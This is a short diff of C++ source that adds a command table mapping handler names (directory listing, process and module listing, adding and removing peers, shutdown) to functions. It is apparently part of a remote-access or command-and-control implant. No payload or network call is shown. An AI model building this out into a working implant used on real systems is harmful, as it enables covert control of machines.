@@ -1,5 +1,14 @@
 #include <core/include/commands.hpp>
 namespace Commands {
+    _code_seg(".rdata") _command_map cmd_map[] = {
+        { .name = DIRECTORYLIST,    .address = DirectoryList    },
+        { .name = PROCESSMODULES,   .address = ProcessModules   },
+        { .name = PROCESSLIST,      .address = ProcessList      },
+        { .name = ADDPEER,          .address = AddPeer          },
+        { .name = REMOVEPEER,       .address = RemovePeer       },
+        { .name = SHUTDOWN,         .address = Shutdown         },
+        { .name = 0,                .address = nullptr          }
+    };
 
     VOID DirectoryList (_parser *const parser) {
         HEXANE
